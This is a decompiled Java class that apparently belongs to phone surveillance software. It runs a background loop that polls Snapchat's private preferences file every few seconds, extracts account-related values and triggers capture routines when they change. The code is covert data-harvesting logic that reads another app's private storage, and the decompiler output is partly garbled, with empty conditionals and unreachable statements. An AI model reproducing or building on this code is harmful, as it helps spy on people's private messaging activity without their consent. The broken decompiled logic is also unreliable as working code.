package com.vvt.capture.snapchat.a;

import android.os.SystemClock;
import com.vvt.capture.snapchat.c;
import com.vvt.io.p;
import java.io.File;

class e
  implements Runnable
{
  e(d paramd) {}
  
  public void run()
  {
    long l = 3000L;
    for (;;)
    {
      try
      {
        SystemClock.sleep(l);
        localObject1 = this.a;
        localObject1 = d.a((d)localObject1);
        localObject3 = "com.snapchat.android_preferences.xml";
        localObject1 = p.a((String)localObject1, (String)localObject3);
        localObject3 = this.a;
        Object localObject4 = new java/io/File;
        ((File)localObject4).<init>((String)localObject1);
        d.a((d)localObject3, (File)localObject4);
        localObject3 = this.a;
        localObject3 = d.b((d)localObject3);
        boolean bool1 = ((File)localObject3).exists();
        if (bool1)
        {
          localObject3 = this.a;
          localObject3 = ((d)localObject3).a;
          bool1 = a.c((a)localObject3);
          if (!bool1) {
            continue;
          }
          int i = com.vvt.capture.snapchat.b.d((String)localObject1);
          boolean bool3 = a.d();
          if (bool3) {}
          localObject4 = this.a;
          localObject4 = ((d)localObject4).a;
          int j = a.d((a)localObject4);
          if (j != i)
          {
            localObject4 = this.a;
            localObject4 = ((d)localObject4).a;
            a.a((a)localObject4, i);
            bool2 = a.d();
            if (bool2) {}
            localObject3 = com.vvt.capture.snapchat.d.a();
            bool4 = c.b((String)localObject3);
            if (!bool4)
            {
              localObject4 = this.a;
              localObject4 = ((d)localObject4).a;
              a.a((a)localObject4, (String)localObject3);
            }
          }
          localObject3 = com.vvt.capture.snapchat.b.b((String)localObject1);
          bool4 = a.d();
          if (bool4) {}
          bool4 = com.vvt.ag.b.a((String)localObject3);
          if (!bool4)
          {
            bool5 = com.vvt.capture.snapchat.b.a((String)localObject1, (String)localObject3);
            if (bool5)
            {
              bool5 = a.d();
              if (bool5) {}
              com.vvt.capture.snapchat.b.a();
            }
          }
        }
        boolean bool5 = a.d();
        if (bool5) {}
        localObject1 = this.a;
      }
      catch (Exception localException)
      {
        Object localObject1;
        Object localObject3;
        boolean bool2;
        boolean bool4;
        int k;
        boolean bool6 = a.c();
        if (!bool6) {
          continue;
        }
        d locald = this.a;
        continue;
      }
      finally
      {
        d.a(this.a, null);
      }
      d.a((d)localObject1, null);
      return;
      localObject3 = this.a;
      localObject3 = ((d)localObject3).a;
      bool4 = com.vvt.capture.snapchat.b.c((String)localObject1);
      a.a((a)localObject3, bool4);
      localObject3 = this.a;
      localObject3 = ((d)localObject3).a;
      bool2 = a.c((a)localObject3);
      if (bool2)
      {
        localObject3 = this.a;
        localObject3 = ((d)localObject3).a;
        k = com.vvt.capture.snapchat.b.d((String)localObject1);
        a.a((a)localObject3, k);
        localObject1 = com.vvt.capture.snapchat.d.a();
        bool2 = c.b((String)localObject1);
        if (!bool2)
        {
          localObject3 = this.a;
          localObject3 = ((d)localObject3).a;
          a.a((a)localObject3, (String)localObject1);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */